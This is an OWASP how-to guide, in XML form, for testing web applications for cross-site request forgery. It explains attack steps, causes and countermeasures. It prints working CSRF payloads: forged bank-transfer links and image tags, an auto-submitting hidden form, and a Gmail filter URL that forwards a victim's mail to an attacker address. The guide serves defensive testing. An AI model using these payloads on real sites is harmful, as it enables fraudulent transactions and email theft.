<?xml version="1.0" encoding="utf-8"?><guidanceItem id="5339f0d4-6052-44a5-9d83-09a116ffdd13" type="howto" title="How to Test for Cross-Site Request Forgery (CSRF) Bugs" cssFile="guidance.css" Date="2011-01-20T03:17:24.671875Z" Author="" Category="Session Management" filePath="..\Libraries\OWASP\How To\5339f0d4-6052-44a5-9d83-09a116ffdd13.xml" Priority="Andres De Vivanco" Rule_Type="Test" Source="OWASP" Status="" Technology=" Any" Topic="Security" Type="How To" xmlns="urn:microsoft:guidanceexplorer:guidanceItem"><content><![CDATA[<H1><SPAN>Applies to:</SPAN></H1><UL><LI><SPAN>Web applications written in languages such as Java, C#, VB .Net, PHP, and Ruby.</SPAN></LI></UL><P><SPAN>&nbsp;</SPAN></P><H1><SPAN>Summary</SPAN></H1><P><SPAN>During Cross-Site Request Forgery (CSRF) -also known as <I>XSRF</I> or <I>session riding</I>- attacks, an attacker forces a victim to make an unexpected web request such as a fraudulent bank transaction.<SPAN>&nbsp;&nbsp; </SPAN>For example, an attacker tricks the victim client into calling a banking function in a vulnerable page that transfers money from the victim&#8217;s to the attacker&#8217;s account.<SPAN>&nbsp; </SPAN>The victim triggers the attack by following an attacker&#8217;s link or visiting an attacker&#8217;s page.<SPAN>&nbsp; </SPAN>The vulnerable server page doesn&#8217;t recheck the authenticity of the victim&#8217;s request and allows the transfer to proceed.</SPAN></P><P><SPAN>Follow these steps to test for CSRF bugs:</SPAN></P><UL><LI><SPAN>Step 1:<SPAN>&nbsp; </SPAN>Understand Attack Scenarios</SPAN> <LI><SPAN>Step 2:<SPAN>&nbsp; </SPAN>Analyze Causes and Countermeasures</SPAN> <LI><SPAN>Step 3:<SPAN>&nbsp; </SPAN>Start Testing and Exploring</SPAN> <LI><SPAN>Step 4:<SPAN>&nbsp; </SPAN>Fine-tune Test Cases</SPAN></LI></UL><P><SPAN>&nbsp;</SPAN></P><H1><SPAN>Step 1:<SPAN>&nbsp; </SPAN>Understand Attack Scenarios</SPAN></H1><P><SPAN>The first step in testing for CSRF bugs is to understand its attack scenarios.<SPAN>&nbsp; </SPAN>Even though the anatomy of a CSRF attack is almost always constant, its objectives may vary:<SPAN>&nbsp; </SPAN>attackers can exploit CSRF bugs to perform unauthorized fraudulent banking transactions, send spoofed email messages, steal sensitive information, and even install a back door.<SPAN>&nbsp; </SPAN>The following steps detail the anatomy of a CSRF attack:</SPAN></P><OL><LI><SPAN>Attacker finds functionality in a web application that is vulnerable to CSRF.</SPAN> <LI><SPAN>Attacker builds a link invoking the vulnerable function and passing the required parameters as to executed the chosen attack.</SPAN> <LI><SPAN>Attacker waits until the victim client authenticates with the vulnerable web application.</SPAN> <LI><SPAN>Attacker tricks victim client into following the malicious link.</SPAN> <LI><SPAN>Victim client sends forged request to vulnerable server.</SPAN> <LI><SPAN>Vulnerable server allows and executes the forged request. </SPAN></LI></OL><P><SPAN>The form of the link built in step 2 depends on the payload that the attacker wants to execute.<SPAN>&nbsp; </SPAN>For example, the link might looks like this when they payload is to transfer money from the victim&#8217;s to the attacker&#8217;s account:</SPAN></P><PRE><STRONG><SPAN><A>/makeTransfer?amount=1000&amp;dest=attacker&#64;attackersite.com'</A></SPAN></STRONG><SPAN>&nbsp;</SPAN></PRE><P><SPAN>The link below sends an email titled </SPAN><SPAN>Hello</SPAN><SPAN> to </SPAN><SPAN>johny&#64;example.com</SPAN><SPAN>: </SPAN></P><PRE><STRONG><SPAN>/sendMail?to=johny&#64;example.com&amp;title=Hello&amp;body=I&#43;did&#43;not&#43;send&#43;this'</SPAN><SPAN></SPAN></STRONG></PRE><P><SPAN></SPAN></P><P><SPAN>A serious flaw discovered in Google&#8217;s Gmail early in 2007 allowed attackers to install a backdoor to forward all emails to them.<SPAN>&nbsp; </SPAN>In the link below the attacker forwards the victim to the attacker&#8217;s site.<SPAN>&nbsp; </SPAN>Then the attacker&#8217;s site makes the fraudulent request in behalf of the victim:</SPAN></P><PRE><SPAN><STRONG>http://www.attakersite.org/util/csrf?method=POST&amp;enctype=multipart/form-data&amp;_action=https&#37;3A//mail.google.com/mail/h/ewt1jmuj4ddv/&#37;3Fv&#37;3Dprf&amp;cf2emc=true&amp;cf2_email=attacker&#64;attackersite.com&amp;cf1_from&amp;cf1_to&amp;cf1_subj&amp;cf1has&amp;cf1hasnot&amp;cf1attach=true&amp;tfi&amp;s=z&amp;irf=on&amp;nvpbucftb=Create&#37;20Filter</STRONG></SPAN></PRE><P><SPAN>Upon receiving the forged HTTP POST request, Gmail forwards all the victim&#8217;s emails to </SPAN><SPAN>attacker&#64;attackersite.com</SPAN><SPAN>.</SPAN><SPAN><SPAN>&nbsp; </SPAN>Furthermore, the attack installs a filter that works as a backdoor for hijacking future emails.</SPAN></P><P><SPAN>&nbsp;</SPAN></P><H1><SPAN>Step 2:<SPAN>&nbsp; </SPAN>Analyze Causes and Countermeasures</SPAN></H1><P><SPAN>During this step you will be shown the causes behind Cross-Site Request Forgery , <SPAN>&nbsp;</SPAN>how to recognize it within your code base and you will be shown coding best practices, as to avoid this issue altogether.</SPAN></P><H2><SPAN><EM>Cross-Site Request Forgery Causes</EM></SPAN></H2><P><SPAN>This kind of vulnerability exists because the web application trusts the forged request.<SPAN>&nbsp; </SPAN>Thus, the cause for this bug is a case of poor or missing authentication code.<SPAN>&nbsp; </SPAN>The application lacks the functionality to verify that every client request is not forged and that it actually originates from a legitimate client action.<SPAN>&nbsp;&nbsp; </SPAN>Web applications vulnerable to CSRF implement a <I>persistent</I> authentication system in which they validate the user against a persistent token such as a session cookie.<SPAN>&nbsp;&nbsp; </SPAN>In persistent authentication, when the server receives a request it only checks if the user is logged in and not if the request comes due to a legitimate client action.</SPAN></P><H2><SPAN><EM>Cross-Site Request Forgery Countermeasures</EM></SPAN></H2><P><SPAN>The main prevention against CSRF vulnerabilities is to provide a <I>transient</I> authentication system &#91;i&#93; instead of a persistent authentication system.<SPAN>&nbsp; </SPAN>Transient authentication systems verify for the authenticity of every request by using an additional check.<SPAN>&nbsp;&nbsp; </SPAN>One way of doing this is to transmit a secret in every URL; especially require a secret in URLs that request create, update, delete, or mail actions.<SPAN>&nbsp; </SPAN>An attacker will not be able to execute an attack unless he knows the secret.<SPAN>&nbsp; </SPAN>The problem is that an attacker can execute a XSS attack and steal the secret.</SPAN></P><P><SPAN>There is no silver bullet against CSRF attacks so developers need to look for ways of raising the bar against attackers.<SPAN>&nbsp;&nbsp; </SPAN>A popular way to protect Internet users from CSRF is by using <I>CAPTCHAs</I> (Completely Automated Turing Test to Test Computers and Humans Apart) that require the client to validate the contents of a bitmap image before the application allows any requests.</SPAN></P><P><SPAN>Other preventions suggested include using POSTs instead of GETs requests to perform actions and or to check the HTTP referrer header.<SPAN>&nbsp; </SPAN>However, both of these countermeasures can be defeated by a knowledgeable attacker since he can easily forge a POST command using a malicious script and can also easily spoof the HTTP referrer.<SPAN>&nbsp; </SPAN></SPAN></P><P><SPAN>&nbsp;</SPAN></P><H1><SPAN>Step 3:<SPAN>&nbsp; </SPAN>Start Testing and Exploring</SPAN></H1><P><SPAN>Now that you&#8217;ve learned how CSRF attacks work and how to defend against them, this step shows the basic test cases to execute to start testing for CSRF bugs.</SPAN></P><P><B><I><SPAN></SPAN></I></B></P><H2><SPAN><EM>Basic Test for Cross-site Request Forgery </EM></SPAN></H2><P><SPAN>Follow these test steps to test against CSRF bugs. </SPAN><B><I><SPAN></SPAN></I></B></P><OL><LI><SPAN>Find a web application page that performs an action based on a user request.</SPAN> <LI><SPAN>Construct a page containing a link or redirect that sends a forged request to the application server.<SPAN>&nbsp; </SPAN>This link usually contains a tag such as an </SPAN><SPAN>img</SPAN><SPAN> or </SPAN><SPAN>iframe</SPAN><SPAN> (although mostly any tags can be used) with the source address pointing to the request:</SPAN> <UL><LI><SPAN><PRE><SPAN>&lt;a href="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000"&gt;View my Pictures&#33;&lt;/a&gt;</SPAN></PRE><PRE><SPAN></SPAN></PRE><PRE><SPAN>&lt;img src="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000" width="1" height="1" border="0"&gt;</SPAN><SPAN>&nbsp;</SPAN></PRE><P><SPAN>Note that the links above will both generate a GET request.<SPAN>&nbsp; </SPAN>In order to test for POST requests you must create a page containing a form with the URL parameters passed as hidden input, and add a script to automatically submit the form:</SPAN><SPAN>&nbsp;</SPAN></P><PRE><SPAN>&lt;form action="http://bank.com/transfer.do" method="post"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="acct" value="MARIA"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="ammount" value="100000"&gt;<BR>&lt;/form&gt; <BR>&lt;script&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.forms&#91;0&#93;.submit();<BR>&lt;/script&gt;<BR></SPAN></PRE></SPAN></LI></UL><SPAN><LI><SPAN>Open an Internet browser and log in to the web application as a legitimate user.</SPAN> <LI><SPAN>Open the page built in step 2 (follow the link if necessary).</SPAN> <LI><SPAN>Confirm if the request was successful.</SPAN> <LI><SPAN>Repeat test case for every application create/update/delete/mail action.</SPAN></SPAN></LI></OL><P><SPAN>Expected result:<SPAN>&nbsp; </SPAN>the test fails if the application trusts and processes the forged request.</SPAN></P><H2><SPAN><EM>Test Use of Secret in URLs</EM></SPAN></H2><P><SPAN>This test will tell you if your application uses secrets in the URL.</SPAN></P><P><SPAN>Testing steps:</SPAN><B><I><SPAN></SPAN></I></B></P><OL><LI><SPAN>Log in to the application as a legitimate user.</SPAN> <LI><SPAN>Browse to a web form that makes a valid request and uses a secret in the URL:<SPAN>&nbsp; </SPAN></SPAN><SPAN><SPAN><UL><LI><SPAN><PRE><SPAN>http://example.com/makeTransfer?amount=1000&amp;dest=attacker&#64;attackersite.com'&amp;<SPAN>secret=2y9ryo2hr2</SPAN></SPAN></PRE></SPAN></LI></UL><LI><SPAN>Start intercepting network traffic using HTTP(s) WebScarab<A title="" style="mso-endnote-id: edn2" href="about:blank#_edn2" name=_ednref2><SPAN><SPAN><SPAN><SPAN>&#91;ii&#93;</SPAN></SPAN></SPAN></SPAN></A> proxy.</SPAN> <LI><SPAN>Configure browser to use WebScarab proxy.</SPAN> <LI><SPAN>Make another request.</SPAN> <LI><SPAN>In WebScarab, modify the URL to change the secret to another value:</SPAN> <UL><LI><PRE><SPAN></SPAN></SPAN></SPAN><SPAN>http://example.com/makeTransfer?amount=1000&amp;dest=attacker&#64;attackersite.com'&amp;<SPAN>secret=</SPAN><SPAN><STRONG>XXXXXXXXXXX</STRONG></SPAN></SPAN></PRE></LI></UL></LI></OL><P><SPAN></SPAN></P><P><SPAN>Expected result:<SPAN>&nbsp; </SPAN>The server must disallow the action since the secret was changed in step 6.<SPAN>&nbsp; </SPAN>The test fails if the server allows the requested action.</SPAN><SPAN></SPAN></P><P><B><I><SPAN></SPAN></I></B></P><H2><SPAN><EM>Test Use of Secret in Cookies</EM></SPAN></H2><P><SPAN>This test will tell you if your application properly uses secrets in the cookies.</SPAN></P><P><SPAN>Testing steps:</SPAN><B><I><SPAN></SPAN></I></B></P><OL><LI><SPAN>Start intercepting traffic network traffic using WebScarab proxy.</SPAN> <LI><SPAN>Open a browser, configure it to go through WebScarab proxy, and log in to the application as a legitimate user.</SPAN> <LI><SPAN>Browse to a page that makes a request and submits a secret using a cookie.</SPAN> <LI><SPAN>Submit request.</SPAN> <LI><SPAN>In WebScarab, replace the secret in the cookie.<SPAN>&nbsp; </SPAN>For instance: </SPAN></LI></OL><BLOCKQUOTE><PRE><SPAN>GET http://www.example.com/trasnfer?amount=1000&amp;dest=1234 HTTP/1.1<BR>Host: localhost<BR>User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14<BR>Accept: text/xml,application/xml,application/xhtml&#43;xml,text/html;q=0.9,text/plain;q=0.8,image/png,&#42;/&#42;;q=0.5<BR>Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3<BR>Accept-Encoding: gzip,deflate<BR>Accept-Charset: ISO-8859-1,utf-8;q=0.7,&#42;;q=0.7<BR>Keep-Alive: 300<BR>Proxy-Connection: keep-alive<BR>Cookie: session-ID=1089eq14; secret=1240u9309u2efija<STRONG>XXXX</STRONG><BR>&nbsp;</SPAN></PRE></BLOCKQUOTE><P><SPAN>Expected result:<SPAN>&nbsp; </SPAN>The server must disallow the action since the secret was changed in step 6.<SPAN>&nbsp; </SPAN>The test fails if the server allows the requested action.</SPAN><SPAN></SPAN></P><P><SPAN>&nbsp;</SPAN></P><H1><SPAN>Step 4:<SPAN>&nbsp; </SPAN>Fine-tune Test Case Data</SPAN></H1><P><SPAN>The final step in testing for CSRF bugs is to fine-tune the test case data to achieve proper test coverage.<SPAN>&nbsp; </SPAN><SPAN>&nbsp;</SPAN>Testing for CSRF bugs require you to fine-tune the test case data as to cover different attack scenarios in an automated fashion.</SPAN></P><H2><SPAN><EM>Fine-tune Test Case Data per objective</EM></SPAN></H2><P><SPAN>Attackers can use CSRF bugs to execute different kinds of attacks.<SPAN>&nbsp; </SPAN>It is important that you test these different payloads depending the characteristics of your application. Common objectives of <SPAN>&nbsp;</SPAN>CSRF attacks include:</SPAN></P><UL><LI><SPAN>Making a fraudulent bank transaction.</SPAN> <LI><SPAN>Sending spoofed email.</SPAN> <LI><SPAN>Exploiting an administrative application.</SPAN> <LI><SPAN>Forcing password resets.</SPAN> <LI><SPAN>Changing router and firewall configurations &#91;iii&#93;.</SPAN></LI></UL><P><SPAN>&nbsp;</SPAN></P><H2><SPAN><EM>Automate test cases </EM></SPAN></H2><P><SPAN>Finally, it is recommended that you extend your test automation by adding CSRF test cases to it.<SPAN>&nbsp; </SPAN>Make a list of all GET requests in URLs and POST requests and write your own script that makes the requests with different session tokens.<SPAN>&nbsp; </SPAN></SPAN></P><H1><SPAN></SPAN>&nbsp;</H1><H1><SPAN>Conclusions</SPAN></H1><P><SPAN>Cross-Site Request Forgery is serious attack class that affects any web application that doesn&#8217;t explicitly protect against it.<SPAN>&nbsp; </SPAN>Testing for CSRF bugs requires you to understand the attack scenarios, the cause of the bugs, and how to defend against them.<SPAN>&nbsp;&nbsp; </SPAN>In addition you must execute different CSRF test cases and fine-tune test case data according to different entry points.</SPAN></P><P><SPAN>&nbsp;</SPAN></P><P>&#91;i&#93; <SPAN><B>Cross-Site Request Forgery</B>.<SPAN>&nbsp; </SPAN>Wikiepedia. <A href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">http://en.wikipedia.org/wiki/Cross-site_request_forgery</A></SPAN></P><DIV><DIV><P><A title="" style="mso-endnote-id: edn2" href="about:blank#_ednref2" name=_edn2></A>&#91;ii&#93; <SPAN><B>Session Riding -<SPAN>&nbsp; </SPAN>A Widespread Vulnerability in Today Web Applications. </B>Thomas Scheiber, SecureNet GmbH, Dec 2004. <A href="http://www.securenet.de/papers/Session_Riding.pdf">http://www.securenet.de/papers/Session_Riding.pdf</A></SPAN></P></DIV><DIV><P><SPAN>&nbsp;</SPAN></P></DIV></DIV>]]></content></guidanceItem>